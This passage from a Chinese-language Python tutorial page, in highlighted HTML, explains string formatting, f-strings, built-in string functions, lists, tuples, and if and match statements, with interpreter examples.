<td><code>%s</code>会把任何数据类型转换为字符串</td>
</tr>
<tr>
<td>%x</td>
<td>十六进制整数</td>
</tr>
</tbody>
</table>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 指定浮点数的小数位数，不足补0，超出四舍五入</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'%0.4f'</span> <span class="token operator">%</span> <span class="token number">3.1415926</span><span class="token punctuation">)</span>
<span class="token number">3.1416</span>

<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'%.2f'</span> <span class="token operator">%</span> <span class="token number">3.1415926</span><span class="token punctuation">)</span>
<span class="token number">3.14</span>

<span class="token comment"># 指定浮点数的小数位数，不足补0</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'%.4f'</span> <span class="token operator">%</span> <span class="token number">3.1</span><span class="token punctuation">)</span>
<span class="token number">3.1000</span>

<span class="token comment"># 指定整数的最小占位数，不足补空格</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'%2d'</span> <span class="token operator">%</span> <span class="token number">1</span><span class="token punctuation">)</span>
 <span class="token number">1</span>

<span class="token comment"># 指定整数的最小占位数，不足补0</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'%02d'</span><span class="token operator">%</span><span class="token number">1</span><span class="token punctuation">)</span>
<span class="token number">01</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="f-string：格式字符串字面值"><a href="https://docs.python.org/zh-cn/3.11/reference/lexical_analysis.html#formatted-string-literals">f-string：格式字符串字面值</a></h4>
<p>是使用以<code>f</code>开头的字符串，称之为<code>f-string</code>，它和普通字符串不同之处在于，字符串如果包含<code>{xxx}</code>，就会以对应的变量替换.</p>
<p>指定了转换符时，表达式求值的结果会先转换，再格式化。转换符 <code>'!s'</code> 调用 <a href="https://docs.python.org/zh-cn/3.11/library/stdtypes.html#str"><code>str()</code></a> 转换求值结果，<code>'!r'</code> 调用 <a href="https://docs.python.org/zh-cn/3.11/library/functions.html#repr"><code>repr()</code></a>，<code>'!a'</code> 调用 <a href="https://docs.python.org/zh-cn/3.11/library/functions.html#ascii"><code>ascii()</code></a>。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> r <span class="token operator">=</span> <span class="token number">2.5</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> s <span class="token operator">=</span> <span class="token number">3.14</span> <span class="token operator">*</span> r <span class="token operator">**</span> <span class="token number">2</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'The area of a circle with radius </span><span class="token interpolation"><span class="token punctuation">{</span>r<span class="token punctuation">}</span></span><span class="token string"> is </span><span class="token interpolation"><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token format-spec">.2f</span><span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>
The area of a circle <span class="token keyword">with</span> radius <span class="token number">2.5</span> <span class="token keyword">is</span> <span class="token number">19.62</span>


<span class="token comment">#使用'!r'</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> name <span class="token operator">=</span> <span class="token string">"Fred"</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token string-interpolation"><span class="token string">f"He said his name is </span><span class="token interpolation"><span class="token punctuation">{</span>name<span class="token conversion-option punctuation">!r</span><span class="token punctuation">}</span></span><span class="token string">."</span></span>
<span class="token string">"He said his name is 'Fred'."</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token string-interpolation"><span class="token string">f"He said his name is </span><span class="token interpolation"><span class="token punctuation">{</span>name<span class="token punctuation">}</span></span><span class="token string">."</span></span>   
<span class="token string">'He said his name is Fred.'</span>


<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token keyword">import</span> decimal
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> width <span class="token operator">=</span> <span class="token number">10</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> precision <span class="token operator">=</span> <span class="token number">4</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> value <span class="token operator">=</span> decimal<span class="token punctuation">.</span>Decimal<span class="token punctuation">(</span><span class="token string">"12.34567"</span><span class="token punctuation">)</span> 
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token string-interpolation"><span class="token string">f"result: </span><span class="token interpolation"><span class="token punctuation">{</span>value<span class="token punctuation">:</span><span class="token punctuation">{</span>width<span class="token punctuation">}</span><span class="token punctuation">.</span><span class="token punctuation">{</span>precision<span class="token punctuation">}</span><span class="token punctuation">}</span></span><span class="token string">"</span></span>
<span class="token string">'result:      12.35'</span>


<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> number <span class="token operator">=</span> <span class="token number">15</span> 
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{</span>number<span class="token punctuation">:</span><span class="token format-spec">#0x</span><span class="token punctuation">}</span></span><span class="token string">"</span></span> 
<span class="token string">'0xf'</span>

<span class="token comment"># 格式化日期</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token keyword">from</span> datetime <span class="token keyword">import</span> datetime
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> today <span class="token operator">=</span> datetime<span class="token punctuation">(</span>year<span class="token operator">=</span><span class="token number">2017</span><span class="token punctuation">,</span> month<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> day<span class="token operator">=</span><span class="token number">27</span><span class="token punctuation">)</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{</span>today<span class="token punctuation">:</span><span class="token format-spec">%B %d, %Y</span><span class="token punctuation">}</span></span><span class="token string">"</span></span>
<span class="token string">'January 27, 2017'</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{</span>today<span class="token operator">=</span><span class="token punctuation">:</span><span class="token format-spec">%B %d, %Y</span><span class="token punctuation">}</span></span><span class="token string">"</span></span> 
<span class="token string">'today=January 27, 2017'</span>

<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> line <span class="token operator">=</span> <span class="token string">"The mill's closed"</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{</span>line<span class="token punctuation">}</span></span><span class="token string">"</span></span>    
<span class="token string">"The mill's closed"</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{</span>line<span class="token operator">=</span><span class="token punctuation">}</span></span><span class="token string">"</span></span> 
<span class="token string">'line="The mill\'s closed"'</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{</span>line <span class="token operator">=</span> <span class="token punctuation">:</span><span class="token format-spec">20</span><span class="token punctuation">}</span></span><span class="token string">"</span></span>
<span class="token string">"line = The mill's closed   "</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{</span>line <span class="token operator">=</span> <span class="token conversion-option punctuation">!r</span><span class="token punctuation">:</span><span class="token format-spec">20</span><span class="token punctuation">}</span></span><span class="token string">"</span></span>
<span class="token string">'line = "The mill\'s closed" '</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="format">format()</h4>
<p>使用字符串的<code>format()</code>方法，它会用传入的参数依次替换字符串内的占位符<code>{0}</code>、<code>{1}</code>……</p>
<h3 id="内置函数">内置函数</h3>
<table>
<thead>
<tr>
<th>函数</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>len(‘asd’)</td>
<td>计算的是<code>str</code>的字符数，如果换成<code>bytes</code>，<code>len()</code>函数就计算字节数</td>
</tr>
<tr>
<td>ord(‘A’)</td>
<td>返回单个字符的整数编码</td>
</tr>
<tr>
<td>chr(‘32’)</td>
<td>整数编码转换为对应的字符</td>
</tr>
<tr>
<td>‘ABC’.encode(‘ascii’)</td>
<td><code>str</code>转<code>bytes</code></td>
</tr>
<tr>
<td>b’ABC’.decode(‘ascii’)</td>
<td><code>bytes</code>转<code>str</code></td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<h2 id="布尔值">布尔值</h2>
<p>区分大小写</p>
<pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">&gt;&gt;&gt; not True
False
&gt;&gt;&gt; not False
True
&gt;&gt;&gt; not 1 &gt; 2
True
&gt;&gt;&gt; 5 &gt; 3 and 3 &gt; 1
True<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="空值">空值</h2>
<p>空值是Python里一个特殊的值，用<code>None</code>表示。<code>None</code>不能理解为<code>0</code>，因为<code>0</code>是有意义的，而<code>None</code>是一个特殊的空值。</p>
<h2 id="列表">列表</h2>
<h3 id="list">list</h3>
<p>list是一种有序的集合，可以随时添加和删除其中的元素。可以包含不同类型的元素。列表支持索引和切片查询</p>
<ol>
<li>
<p>定义</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> letters <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">,</span> <span class="token string">'d'</span><span class="token punctuation">,</span> <span class="token string">'e'</span><span class="token punctuation">,</span> <span class="token string">'f'</span><span class="token punctuation">,</span> <span class="token string">'g'</span><span class="token punctuation">]</span>

<span class="token comment"># 嵌套列表（创建包含其他列表的列表）</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> a <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">]</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> n <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> x <span class="token operator">=</span> <span class="token punctuation">[</span>a<span class="token punctuation">,</span> n<span class="token punctuation">]</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> x
<span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> x<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
<span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">]</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> x<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
<span class="token string">'b'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p>添加</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 末尾追加元素</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> letters <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'f'</span><span class="token punctuation">,</span> <span class="token string">'g'</span><span class="token punctuation">]</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> letters<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'h'</span><span class="token punctuation">)</span> 
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> letters
<span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'f'</span><span class="token punctuation">,</span> <span class="token string">'g'</span><span class="token punctuation">,</span> <span class="token string">'h'</span><span class="token punctuation">]</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> letters <span class="token operator">+=</span> <span class="token string">'i'</span>      
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> letters
<span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'f'</span><span class="token punctuation">,</span> <span class="token string">'g'</span><span class="token punctuation">,</span> <span class="token string">'h'</span><span class="token punctuation">,</span> <span class="token string">'i'</span><span class="token punctuation">]</span>

<span class="token comment"># 把元素插入到指定的位置</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> letters  
<span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'f'</span><span class="token punctuation">,</span> <span class="token string">'g'</span><span class="token punctuation">,</span> <span class="token string">'h'</span><span class="token punctuation">,</span> <span class="token string">'i'</span><span class="token punctuation">]</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> letters<span class="token punctuation">.</span>insert<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">)</span> 
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> letters
<span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">,</span> <span class="token string">'f'</span><span class="token punctuation">,</span> <span class="token string">'g'</span><span class="token punctuation">,</span> <span class="token string">'h'</span><span class="token punctuation">,</span> <span class="token string">'i'</span><span class="token punctuation">]</span>

<span class="token comment"># 合并操作</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> letters <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">,</span> <span class="token string">'d'</span><span class="token punctuation">,</span> <span class="token string">'e'</span><span class="token punctuation">,</span> <span class="token string">'f'</span><span class="token punctuation">,</span> <span class="token string">'g'</span><span class="token punctuation">]</span>          
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> letters <span class="token operator">+=</span> <span class="token punctuation">[</span><span class="token string">'h'</span><span class="token punctuation">,</span> <span class="token string">'i'</span><span class="token punctuation">]</span> 
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> letters
<span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">,</span> <span class="token string">'d'</span><span class="token punctuation">,</span> <span class="token string">'e'</span><span class="token punctuation">,</span> <span class="token string">'f'</span><span class="token punctuation">,</span> <span class="token string">'g'</span><span class="token punctuation">,</span> <span class="token string">'h'</span><span class="token punctuation">,</span> <span class="token string">'i'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p>修改</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> letters <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">,</span> <span class="token string">'d'</span><span class="token punctuation">,</span> <span class="token string">'e'</span><span class="token punctuation">,</span> <span class="token string">'f'</span><span class="token punctuation">,</span> <span class="token string">'g'</span><span class="token punctuation">]</span>

<span class="token comment"># 修改元素</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> letters<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">]</span>
<span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">,</span> <span class="token string">'d'</span><span class="token punctuation">,</span> <span class="token string">'e'</span><span class="token punctuation">]</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> letters<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'C'</span><span class="token punctuation">,</span> <span class="token string">'D'</span><span class="token punctuation">,</span> <span class="token string">'E'</span><span class="token punctuation">]</span> 
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> letters<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">]</span> 
<span class="token punctuation">[</span><span class="token string">'C'</span><span class="token punctuation">,</span> <span class="token string">'D'</span><span class="token punctuation">,</span> <span class="token string">'E'</span><span class="token punctuation">]</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> letters     
<span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'C'</span><span class="token punctuation">,</span> <span class="token string">'D'</span><span class="token punctuation">,</span> <span class="token string">'E'</span><span class="token punctuation">,</span> <span class="token string">'f'</span><span class="token punctuation">,</span> <span class="token string">'g'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p>删除</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> letters <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">,</span> <span class="token string">'d'</span><span class="token punctuation">,</span> <span class="token string">'e'</span><span class="token punctuation">,</span> <span class="token string">'f'</span><span class="token punctuation">,</span> <span class="token string">'g'</span><span class="token punctuation">]</span>

<span class="token comment"># 切片删除元素</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> letters<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> letters          
<span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'f'</span><span class="token punctuation">,</span> <span class="token string">'g'</span><span class="token punctuation">]</span>

<span class="token comment"># 删除末尾元素</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> letters          
<span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'f'</span><span class="token punctuation">,</span> <span class="token string">'g'</span><span class="token punctuation">]</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> letters<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>    
<span class="token string">'g'</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> letters
<span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'f'</span><span class="token punctuation">]</span>

<span class="token comment"># 删除指定位置元素</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> letters<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> 
<span class="token string">'b'</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> letters        
<span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'f'</span><span class="token punctuation">]</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
</ol>
<h3 id="tuple">tuple</h3>
<p>有序、不可变</p>
<ol>
<li>
<p>定义</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 普通定义</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> classmates <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'Michael'</span><span class="token punctuation">,</span> <span class="token string">'Bob'</span><span class="token punctuation">,</span> <span class="token string">'Tracy'</span><span class="token punctuation">)</span>

<span class="token comment"># 空</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> classmates <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token comment"># 一个元素（歧义）</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> test <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">)</span> 
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> test
<span class="token string">'test'</span>
<span class="token comment"># 一个元素（元组定义）</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> test <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">,</span><span class="token punctuation">)</span> 
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> test
<span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p>只有1个元素的tuple定义时必须加一个逗号<code>,</code>，来消除歧义。而显示时，也会带上一个逗号<code>, </code></p>
</li>
<li>
<p>“可变的”tuple：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> t <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'A'</span><span class="token punctuation">,</span> <span class="token string">'B'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> t<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'X'</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> t<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'Y'</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> t
<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'X'</span><span class="token punctuation">,</span> <span class="token string">'Y'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="D:%5CNotespace%5CHexo%5Chmxyl%5Csource_images%5Cspaces%2FgYzJOgqycOATew45KSSW%2Fuploads%2FAj60qA8UyPKxQFTtmmXx%2Fimage.png" alt="初始定义的tuple"></p>
<p>当我们把list的元素<code>'A'</code>和<code>'B'</code>修改为<code>'X'</code>和<code>'Y'</code>后，tuple变为：</p>
<p><img src="D:%5CNotespace%5CHexo%5Chmxyl%5Csource_images%5Cspaces%2FgYzJOgqycOATew45KSSW%2Fuploads%2FOYV5J5oQeGAYKW8rTnod%2Fimage.png" alt="修改后的tuple"></p>
<p>表面上看，tuple的元素确实变了，但其实变的不是tuple的元素，而是list的元素。</p>
<p>tuple一开始指向的list并没有改成别的list，所以，tuple所谓的“不变”是说，tuple的每个元素，指向永远不变。即指向<code>'a'</code>，就不能改成指向<code>'b'</code>，指向一个list，就不能改成指向其他对象，但指向的这个list本身是可变的。</p>
<p>理解了“指向不变”后，要创建一个内容也不变的tuple怎么做？那就必须保证tuple的每一个元素本身也不能变。</p>
</li>
</ol>
<h2 id="字典">字典</h2>
<h1>控制流工具</h1>
<h2 id="if-语句">if 语句</h2>
<p>完整结构</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">if</span> <span class="token operator">&lt;</span>条件判断<span class="token number">1</span><span class="token operator">&gt;</span><span class="token punctuation">:</span>
    <span class="token operator">&lt;</span>执行<span class="token number">1</span><span class="token operator">&gt;</span>
<span class="token keyword">elif</span> <span class="token operator">&lt;</span>条件判断<span class="token number">2</span><span class="token operator">&gt;</span><span class="token punctuation">:</span>
    <span class="token operator">&lt;</span>执行<span class="token number">2</span><span class="token operator">&gt;</span>
<span class="token keyword">elif</span> <span class="token operator">&lt;</span>条件判断<span class="token number">3</span><span class="token operator">&gt;</span><span class="token punctuation">:</span>
    <span class="token operator">&lt;</span>执行<span class="token number">3</span><span class="token operator">&gt;</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    <span class="token operator">&lt;</span>执行<span class="token number">4</span><span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><code>if</code>判断条件还可以简写，比如写：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">if</span> x<span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'True'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>只要<code>x</code>是非零数值、非空字符串、非空list等，就判断为<code>True</code>，否则为<code>False</code></p>
<h2 id="match-语句">match 语句</h2>
<ol>
<li>
<p>单个值匹配</p>
<p>最简单的形式是将一个主语值与一个或多个字面值进行比较：</p>
<pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">def http_error(status):
    match status:
        case 400:
            return "Bad request"
        case 401 | 403 | 404:
            return "Not allowed"
        case 404:
            return "Not found"
        case 418:
            return "I'm a teapot"
        case _:
            return "Something's wrong with the internet"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>注意最后一个代码块：“变量名” <code>_</code> 被作为 <em>通配符</em> 并必定会匹配成功。如果没有 case 匹配成功，则不会执行任何分支。</p>
<p>你可以使用 <code>|</code> （“ or ”）在一个模式中组合几个字面值</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">case</span> <span class="token number">401</span> <span class="token operator">|</span> <span class="token number">403</span> <span class="token operator">|</span> <span class="token number">404</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token string">"Not allowed"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
</li>
<li>
<p>解包赋值</p>
<p><code>match</code>语句除了可以匹配简单的单个值外，还可以匹配多个值、匹配一定范围，并且把匹配后的值绑定到变量：</p>
</li>
</ol>
<h2 id="for-语句">for 语句</h2>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># Measure some strings:</span>
